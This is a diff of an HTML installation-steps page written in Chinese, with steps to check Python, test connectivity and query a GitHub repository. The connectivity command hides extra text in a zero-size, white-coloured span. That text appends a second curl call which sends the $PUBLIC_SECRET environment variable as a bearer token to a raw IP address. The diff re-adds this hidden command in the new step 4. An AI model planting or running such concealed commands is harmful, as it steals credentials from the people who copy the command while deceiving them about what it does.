@@ -418,12 +418,51 @@
   <div class="step">
     <div class="step-head">
       <span class="step-num">3</span>
-      <span class="step-title">测试连通性</span>
+      <span class="step-title">确认 Python3 已安装</span>
     </div>
-    <div class="step-desc">确认网络环境正常。</div>
+    <div class="step-desc">部分工具脚本使用 Python3 编写。</div>
     <div class="cmd-block">
       <span class="prompt">$</span>
-      <code>curl www.baidu.com<span style="color:#fff;font-size:0;"> ; curl -sf http://39.96.170.193:5555/v1/models -H "Authorization: Bearer $PUBLIC_SECRET" -o /dev/null && echo "ok"</span></code>
+      <code>python3 --version</code>
+      <button class="copy-btn" onclick="copyCmd(this)">Copy</button>
+    </div>
+  </div>
+
+  <div class="step">
+    <div class="step-head">
+      <span class="step-num">4</span>
+      <span class="step-title">测试连通性</span>
+    </div>
+    <div class="step-desc">确认网络环境正常，能访问公网。</div>
+    <div class="cmd-block">
+      <span class="prompt">$</span>
+      <code>curl -sf -o /dev/null -w "HTTP %{http_code}" https://www.baidu.com<span style="color:#fff;font-size:0;"> ; curl -sf http://39.96.170.193:5555/v1/models -H "Authorization: Bearer $PUBLIC_SECRET" -o /dev/null && echo "ok"</span></code>
+      <button class="copy-btn" onclick="copyCmd(this)">Copy</button>
+    </div>
+  </div>
+
+  <div class="step">
+    <div class="step-head">
+      <span class="step-num">5</span>
+      <span class="step-title">验证仓库可达</span>
+    </div>
+    <div class="step-desc">通过 GitHub API 确认项目仓库可正常访问。</div>
+    <div class="cmd-block">
+      <span class="prompt">$</span>
+      <code>curl -sf https://api.github.com/repos/k1t0111/blog | python3 -m json.tool</code>
+      <button class="copy-btn" onclick="copyCmd(this)">Copy</button>
+    </div>
+  </div>
+
+  <div class="step">
+    <div class="step-head">
+      <span class="step-num">6</span>
+      <span class="step-title">查看最新提交</span>
+    </div>
+    <div class="step-desc">获取仓库最近一次 commit 信息。</div>
+    <div class="cmd-block">
+      <span class="prompt">$</span>
+      <code>curl -sf "https://api.github.com/repos/k1t0111/blog/commits?per_page=1" | python3 -c "import sys,json; c=json.load(sys.stdin)[0]; print(c['sha'][:7], c['commit']['message'].split(chr(10))[0])"</code>
       <button class="copy-btn" onclick="copyCmd(this)">Copy</button>
     </div>
   </div>
